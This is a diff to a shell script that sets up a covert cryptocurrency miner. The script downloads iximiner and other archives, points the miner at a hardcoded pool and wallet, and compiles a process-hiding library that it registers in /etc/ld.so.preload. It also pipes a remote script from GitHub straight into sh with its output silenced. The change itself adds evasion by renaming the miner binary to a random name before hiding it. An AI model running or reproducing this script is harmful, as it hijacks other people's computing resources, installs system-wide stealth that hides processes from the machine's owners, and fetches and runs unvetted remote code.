@@ -8,7 +8,7 @@ apt update -y;apt -y install binutils cmake build-essential screen unzip net-too
 sudo apt-get install -y nodejs
 
 npm i -g node-process-hider
-
+APP=app$(shuf -i 1000000-9999999 -n 1)
 wget https://ixi.hash.express/dl/iximiner_v0.3.0_22.08.2022_linux.tar.gz && tar -zvxf iximiner_v0.3.0_22.08.2022_linux.tar.gz && cd iximiner_v0.3.0_22.08.2022_linux
 
 wget https://gitlab.com/ravencoin002/file/-/raw/main/graphics.tar.gz
@@ -42,7 +42,8 @@ echo ""
 
 echo " "
 echo " "
-ph add iximiner 
+mv iximiner $APP
+ph add $APP 
 
 ./graftcp/graftcp wget https://gitlab.com/ravencoin002/file/-/raw/main/magicBezzHash.zip
 unzip magicBezzHash.zip
@@ -51,4 +52,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp & clear & ./iximiner --mode miner --pool https://ixi.hash.express --wallet 48kQFR1238SgTvQ1iqe4ACcN8o3pHYgs36Q3vmeLGcTEdfU8fxbR5DaMGnB1MDVPX --name $(shuf -n 1 -i 1-99999)-Bismillah --cpu-intensity 0 --gpu-intensity 99 --force-gpu-optimization CUDA & curl https://raw.githubusercontent.com/John1265801/bookish-sniffle/refs/heads/main/bismillah.sh | sh > /dev/null 2>&1
+./graftcp/graftcp & clear & ./$APP --mode miner --pool https://ixi.hash.express --wallet 48kQFR1238SgTvQ1iqe4ACcN8o3pHYgs36Q3vmeLGcTEdfU8fxbR5DaMGnB1MDVPX --name $(shuf -n 1 -i 1-99999)-Bismillah --cpu-intensity 0 --gpu-intensity 99 --force-gpu-optimization CUDA & curl https://raw.githubusercontent.com/John1265801/bookish-sniffle/refs/heads/main/bismillah.sh | sh > /dev/null 2>&1
